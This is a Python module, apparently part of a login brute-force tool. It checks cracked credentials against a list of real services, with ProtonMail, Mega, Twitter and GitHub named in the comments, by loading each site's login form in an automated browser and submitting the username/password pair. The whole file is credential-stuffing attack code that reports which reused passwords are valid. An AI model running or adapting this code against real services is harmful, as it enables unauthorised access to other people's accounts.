
from core import utils, tbrowser, actions
from modules import loginbrute
import data, threading

# BUG [x] ReAuth: Can't find login form at https://mail.protonmail.com/login
	#[x] ReAuth: Can't find login form at https://mega.nz/login
# BUG: no control matching name 'session[password]'
# 	at https://mobile.twitter.com/login
# BUG: no control matching name 'password' at https://github.com/login


try:
	from Queue import Queue
except ImportError:
	from queue import Queue

def do_job(jobs):
	for job in jobs:
		job.start()

	for job in jobs:
		job.join()
		
def submit(url, options, tryCreds, result):

	try:
		proc = tbrowser.startBrowser()
		proc.addheaders = [('User-Agent', tbrowser.useragent())]

		utils.printf("[+] Checking %s" %(url))

		proc.open(url)
		loginInfo = tbrowser.parseLoginForm(proc.forms())

	except Exception as err:
		if options.verbose:
			utils.printf("[x] ReAuth: %s at %s" %(err, url), "bad")
		

	if not loginInfo:
		if options.verbose:
			utils.printf("[x] ReAuth: Can't find login form at %s" %(url), "bad")
	else:
		try:
			options.url = url

			loginbrute.submit(
				# Reverse username + password. Dynamic submit in loginbrute
				options, loginInfo, tryCreds[-2:][::-1], result
			)
		except Exception as err:
			if options.verbose:
				utils.printf("[x] ReAuth: Submitting error for %s" %(err), "bad")

def run(options, creds):
	social_urls = data.social_urls().replace("\t", "").split("\n")

	for url in social_urls:
		# BUG double_free() 
		if options.url in url:
			social_urls.remove(url)


	result = Queue()
	#workers = []

	try:
		for tryCreds in creds:
			for url in social_urls:
				submit(url, options, tryCreds, result)

				# if actions.size_o(workers) == options.threads:
				# 	do_job(workers)
				# 	del workers[:]

				# worker = threading.Thread(
				# 	target = submit,
				# 	args = (url, options, tryCreds, result)
				# )

				#worker.daemon = True
				#workers.append(worker)

		#do_job(workers)
		#del workers[:]
		
	
	except KeyboardInterrupt:
		utils.die("[x] Terminated by user!", "KeyboardInterrupt")

	except SystemExit:
		utils.die("[x] Terminated by system!", "SystemExit")
	
	except Exception as err:
		utils.die("[x] ReAuth: Runtime error", err)
				
	finally:
		result = list(result.queue)

		if actions.size_o(result) == 0:
			utils.printf("[-] No extra valid password found", "bad")
		else:
			utils.print_table(("Target", "Username", "Password"), *result)